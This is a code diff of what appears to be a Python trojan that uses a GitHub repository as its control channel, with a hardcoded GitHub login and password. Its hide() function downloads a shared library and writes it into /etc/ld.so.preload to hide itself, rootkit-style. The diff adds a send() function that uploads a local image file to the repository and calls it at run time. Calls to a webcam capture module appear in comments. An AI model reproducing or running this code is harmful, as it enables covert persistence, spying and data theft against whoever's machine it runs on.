@@ -8,6 +8,7 @@ import os
 from github3 import login
 from subprocess import call
 import urllib
+
 def connect_to_github() :
 	gh = login("mehdi-desu",password="1090prixttc")
 	repo = gh.repository("mehdi-desu","projet_impossible")
@@ -34,19 +35,22 @@ def load_module(name):
 	sys.modules[name] = module
 	return module
 
-def store_module_result() :
-	gh,repo,branch = connect_to_github()
-	repo.create_file("data/ss.txt","add a file", "a stupid string")
-
- 
 def hide():
 	urllib.urlretrieve('https://raw.github.com/mehdi-desu/projet_impossible/master/modules/hider.so','/usr/local/lib/hider.so') 
  	f = open('/etc/ld.so.preload','w')
 	f.write("/usr/local/lib/hider.so")
 	f.close()
-hide()
+
+def send():
+	gh,repo,branch = connect_to_github()
+	f = open('bean.jpeg','r')
+#	repo.create_file("data/mrbean64.jpeg","add a file",base64.b64encode(f.read()))
+	repo.create_file("data/mrbean.jpeg","add a file",f.read())
+
+send()
+#hide()
 #cam = load_module("cam")
-while True:
+#while True:
 #	cam.snap()
-	print "ddd"
-	time.sleep(1)
+#	print "ddd"
+#	time.sleep(1)
